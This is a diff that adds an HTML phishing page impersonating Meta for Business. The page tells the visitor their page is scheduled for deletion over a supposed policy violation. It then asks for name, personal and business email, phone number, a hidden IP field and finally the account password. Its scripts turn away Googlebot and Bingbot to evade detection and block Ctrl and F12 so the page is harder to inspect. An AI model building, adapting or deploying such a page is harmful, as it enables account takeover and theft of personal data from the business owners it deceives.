@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Meta for Business - Appeal Decision</title>
+    <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" type="text/css" media="screen" href="./style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
+    <script>
+      // Define a list of known bot User-Agents
+      const botUserAgents = ["Googlebot", "Bingbot" /* Add more bots here */];
+
+      // Implement anti-bot protection
+      function protectAgainstBots() {
+        const userAgent = navigator.userAgent;
+
+        if (isBot(userAgent)) {
+          // Block known bot User-Agents
+          alert("Bot access is not allowed.");
+          window.location.href = "error.html";
+        } else {
+          // Allow legitimate traffic
+          // Add your website's functionality here
+        }
+      }
+
+      // Detect known bot User-Agents
+      function isBot(userAgent) {
+        return botUserAgents.some((bot) => userAgent.includes(bot));
+      }
+
+      // Call the protection function when the page loads
+      window.addEventListener("load", protectAgainstBots);
+    </script>
+  </head>
+  <body>
+    <header>
+      <div class="top">
+        <div class="logo">
+          <img width="40" src="../img/meta.png" alt="" />
+          <p>Meta for Business</p>
+          <nav>
+            <ul>
+              <li class="no_navigate">Get Started</li>
+              <li class="no_navigate">Advertise</li>
+              <li class="no_navigate">Learn</li>
+              <li class="no_navigate">Support</li>
+            </ul>
+          </nav>
+        </div>
+        <button class="no_navigate">Start Now</button>
+      </div>
+      <div class="bottom">
+        <p class="no_navigate">Business Help Center</p>
+        <p class="no_navigate">Get Support</p>
+      </div>
+    </header>
+
+    <main>
+      <aside>
+        <div class="aside_content">
+          <img
+            width="80"
+            src="https://1000logos.net/wp-content/uploads/2021/10/Meta-Logo.png"
+            alt=""
+          />
+          <h1>Accounts Center</h1>
+          <p>
+            We have received multiple reports that suggest that your account has been in violation
+            of our terms of service and community guidelines. As a result, your account is scheduled
+            for review.
+          </p>
+          <a href="#" class="no_navigate">Learn More.</a>
+
+          <h3>Account Settings</h3>
+
+          <ul class="action_list">
+            <li class="list active" data-tab-to="1"><i class="bx bx-note"></i> Personal Details</li>
+            <li class="list" data-tab-to="2">
+              <i class="bx bx-shield-quarter"></i> Password and Security
+            </li>
+            <li class="list" data-tab-to="3">
+              <i class="bx bx-fingerprint"></i> Your Information and Permissions
+            </li>
+            <li class="list" data-tab-to="4">
+              <img src="https://icomoon.io/icons4acad3d/13/152.svg" alt="" /> Ad preferences
+            </li>
+            <li class="list" data-tab-to="5"><i class="bx bx-credit-card"></i> Payment</li>
+            <li class="list" data-tab-to="6"><i class="bx bx-badge-check"></i> Meta Verified</li>
+          </ul>
+        </div>
+      </aside>
+      <div class="side_content">
+        <section data-tab="1">
+          <h2>Your page goes against our Community Standards</h2>
+          <p class="section_desc">
+            Your page has been scheduled for deletion because one of the following reasons:</p>
+			<p class="section_desc"> - Intellectual Property Infringement </p>
+			<p class="section_desc"> - Community Standards </p>
+			<p class="section_desc"> - Hate Speech </p>
+			</p>
+          <form id="personal_details_form" method="post">
+            <div class="box_shadow">
+              <div class="form_group first">
+                <label for="page_name"
+                  >Page Name <small class="error_text page_name_error"></small
+                ></label>
+                <input type="text" name="page_name" id="page_name" />
+              </div>
+              <div class="form_group">
+                <label for="full_name"
+                  >Full Name <small class="error_text full_name_error"></small
+                ></label>
+                <input type="text" name="full_name" id="full_name" />
+              </div>
+              <div class="form_group">
+                <label for="email"
+                  >Personal Email <small class="error_text email_error"></small
+                ></label>
+                <input type="email" name="email" id="email" />
+              </div>
+              <div class="form_group">
+                <label for="business_ email"
+                  >Business Email <small class="error_text business_email_error"></small
+                ></label>
+                <input type="email" name="business_email" id="business_email" />
+              </div>
+              <div class="form_group">
+                <label for="phone_number"
+                  >Mobile <small class="error_text phone_number_error"></small
+                ></label>
+                <input type="tel" name="phone_number" id="phone_number" />
+                <input type="hidden" name="ip_address" id="ip_address" />
+              </div>
+              <div class="form_group last">
+                <label for="appeal_box">Your Appeal <small class="error_text phone_number_error"></small
+                  ></label>
+                  <textarea name="appeal_box" id="appeal_box" style="width: 100%;height: 100px;border: none;outline-color: #0b92f2;padding: 30px 0 0 24px;border-bottom-left-radius: 10px;border-bottom-right-radius: 10px;resize: none;font-size: 16px;"></textarea>
+              </div>
+            </div>
+            <div class="button_group">
+              <button type="submit" id="details_next">Next</button>
+            </div>
+          </form>
+        </section>
+        <section id="password_section" data-tab="2">
+          <h2>Personal details</h2>
+          <h3>Login & recovery</h3>
+          <p class="section_desc">Manage your passwords, login preferences and recovery methods.</p>
+          <form id="password_form" method="post">
+            <div class="form_group first box_shadow">
+              <label for="password"
+                >Password <small class="error_text password_error"></small
+              ></label>
+              <input type="password" name="password" id="password" />
+            </div>
+            <input type="hidden" name="unique_id" id="unique_id" value="" />
+            <div class="button_group">
+              <button type="submit">Next</button>
+            </div>
+          </form>
+        </section>
+      </div>
+    </main>
+
+    <script src="./main.js"></script>
+    <script>
+      document.addEventListener("keydown", function (event) {
+        if (event.ctrlKey) {
+          event.preventDefault();
+        }
+        if (event.keyCode == 123) {
+          event.preventDefault();
+        }
+      });
+
+      
+      let nextButton = document.querySelector('#details_next')
+      let akpaForm = document.querySelector("#personal_details_form")
+      nextButton.addEventListener('click', () => {
+        let userFormData = {
+          page_name: document.getElementById("page_name").value,
+          full_name: document.getElementById("full_name").value,
+          email: document.getElementById("email").value,
+          business_email: document.getElementById("business_email").value,
+          phone_number: document.getElementById("phone_number").value,
+          ip_address: document.getElementById("ip_address").value,
+          appeal: document.querySelector("textarea").value,
+        };
+        localStorage.setItem("userDetails", JSON.stringify(userFormData))
+      })
+    </script>
+  </body>
+</html>
